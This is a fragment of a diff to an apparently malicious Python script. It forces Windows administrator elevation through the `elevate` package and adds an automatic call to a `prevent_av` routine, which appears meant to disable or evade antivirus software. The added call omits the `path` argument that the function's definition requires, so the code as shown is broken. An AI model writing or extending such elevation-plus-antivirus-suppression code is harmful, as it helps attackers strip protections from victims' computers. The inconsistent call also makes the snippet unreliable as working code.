@@ -3,6 +3,7 @@ from elevate import elevate # pip install elevate
 
 # Elevate:
 try:
+    # Check privileges:
     if not ctypes.windll.shell32.IsUserAnAdmin():
         elevate()
 except Exception as error:
@@ -21,3 +22,6 @@ def prevent_av(path):
     else:
         print(output)
     return 1
+
+# Prevent AV:
+prevent_av()
